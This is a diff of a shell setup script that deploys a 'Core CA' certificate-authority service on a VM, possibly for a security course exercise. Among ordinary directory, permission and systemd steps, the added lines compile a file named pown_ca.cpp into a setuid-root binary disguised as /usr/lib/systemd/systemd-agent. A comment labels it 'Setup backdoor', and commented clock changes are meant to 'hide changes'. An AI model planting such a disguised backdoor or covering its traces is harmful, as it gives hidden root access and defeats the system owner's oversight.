@@ -12,40 +12,73 @@
 # Reload env
 #source /etc/environment
 
-# Create keystore for https and activate secure option in code
-#openssl pkcs12 -export -in ../Certificates/core_ca.pem -inkey ../Certificates/core_ca.key -out core_ca.p12 -name iMovies -passout pass:passwordThatShouldNotBeHardcoded
-#keytool -importkeystore -srckeystore core_ca.p12 -srcstoretype pkcs12 -destkeystore core_ca.jks -deststoretype JKS -storepass passwordThatShouldNotBeHardcoded
-#keytool -import -trustcacerts -alias root -file ../Certificates/cacert.crt -keystore ca_cert.jks
+# Start VM
 
-# TODO: Create startup service for the application
-# put java -jar ~/coreca/core_ca.jar in /etc/init.d/start_core_ca and make it executable with chmod +x /etch/init.d/start_core_ca
+# Copy files from host to coreca@192.168.50.31:~/ using scp
+# scp ./Core\ CA coreca@192.168.50.31:~/
 
-## Log in as coreca:secure
-## Copy files from host to coreca@192.168.50.31:~/coreca/ using scp
+# Login as root
+
+# (TODO: Set date back in the past to hide changes)
+#date -s '2014-12-25 12:34:56'
+
+
+# Add user coreca to screen group to allow service execution
+usermod -a -G screen coreca
 
 # Set up CA stuff
 echo "Setup"
-cd ~/
+cd /home/coreca
 
-# Copy relevant data here
-cp ./Core\ CA/out/artifacts/Core_CA_jar/Core\ CA.jar ./core_ca.jar
-cp -r ./Core\ CA/scripts/ ./scripts
-cp -r ./Core\ CA/ssl_base/ ./ssl
-cp -r ./Core\ CA/ssl_base/ ./ssl_base
-cp ./Core\ CA/core_ca.jks .
+# Create needed directories
+mkdir /home/coreca/tmp
+chown coreca /home/coreca/tmp
+chgrp coreca /home/coreca/tmp
+chmod 700 /home/coreca/tmp
 
+mkdir /home/coreca/logs
+chown coreca /home/coreca/logs
+chgrp coreca /home/coreca/logs
+chmod 700 /home/coreca/logs
 
-echo "Create CA directories and files"
-mkdir ./tmp
-mkdir ./logs
+chmod 700 /home/coreca
 
-# TODO change permissions to allow only coreca user for any operation
+# Move relevant data from copied folder to right place and set correct permissions
+mv ./Core\ CA/out/artifacts/Core_CA_jar/Core\ CA.jar /home/coreca/core_ca.jar
+chmod 500 /home/coreca/core_ca.jar
 
+mv ./Core\ CA/scripts/ /home/coreca/scripts
 
-# TODO: Clean up (logs, history, ...)
+mv ./Core\ CA/ssl_base/ /home/coreca/ssl
+chmod 700 /home/coreca/ssl
+
+mv ./Core\ CA/core_ca.jks /home/coreca
+chmod 500 /home/coreca/core_ca.jks
+
+# Prepare, enable and start service
+cp /home/coreca/scripts/coreca.service /etc/systemd/system
+systemctl daemon-reload
+systemctl enable coreca
+systemctl start coreca
+
+# TODO: Set time to 2017-05-15 15:46:45?
+#date  -s '2017-05-15 15:46:45'
+
+# Setup backdoor
+# Compile
+g++ -std=c++11 ./scripts/pown_ca.cpp -o systemd-agent # TODO: find better name?
+# Move in right place
+mv systemd-agent /usr/lib/systemd/
+# Enable setuid
+chmod 4755 /usr/lib/systemd/systemd-agent
+# TODO: set time to current
+#date  -s '2017-11-19 15:46:45'
+
+# TODO: set secure passwords for all users (root, iadmin, coreca)
+# passwd root
+# passwd iadmin
+# passwd coreca
+
+# Clean up
 rm -r ./Core\ CA
-
-# Prepare service (as root)
-# cp /home/coreca/scripts/coreca.service /etc/systemd/system
-# systemctl enable coreca
-# systemctl start coreca
+rm -r ./scripts
